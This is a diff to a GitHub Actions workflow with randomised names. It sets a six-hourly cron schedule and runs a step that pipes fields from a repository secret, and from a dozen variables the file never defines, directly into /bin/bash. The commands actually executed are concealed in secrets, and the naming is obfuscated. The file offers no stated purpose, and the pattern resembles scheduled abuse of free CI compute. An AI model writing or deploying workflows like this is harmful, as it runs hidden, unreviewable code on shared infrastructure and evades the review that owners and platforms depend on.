@@ -3,7 +3,8 @@ name: xupingzhi4321
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 1/6 * * *'
+    - cron: '18 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: xupingzhi4321
         env:
-          bh555: ${{ secrets.bh555 }}
+          j381: ${{ secrets.j381 }}
         run: |
-          echo $bh555 | jq -r .q655 | /bin/bash
-          echo $vao64 | jq -r .dyos914 | /bin/bash
-          echo $rk2993 | jq -r .juspz20458 | /bin/bash
-          echo $sue8 | jq -r .qjwy97 | /bin/bash
+          echo $j381 | jq -r .x1714 | /bin/bash
+          echo $vcei453 | jq -r .e997 | /bin/bash
+          echo $hvsbc22499 | jq -r .ecxz249 | /bin/bash
+          echo $twmz13 | jq -r .x798 | /bin/bash
+          echo $vk200 | jq -r .uq637 | /bin/bash
+          echo $bsqxj81 | jq -r .k47 | /bin/bash
+          echo $wxjos16511 | jq -r .cxd1 | /bin/bash
+          echo $xun95933 | jq -r .zpzn35 | /bin/bash
+          echo $bs5 | jq -r .qgid2 | /bin/bash
+          echo $miesr0 | jq -r .r8122 | /bin/bash
+          echo $cgvpj671 | jq -r .gyhh0 | /bin/bash
+          echo $ci4 | jq -r .d9775 | /bin/bash
 
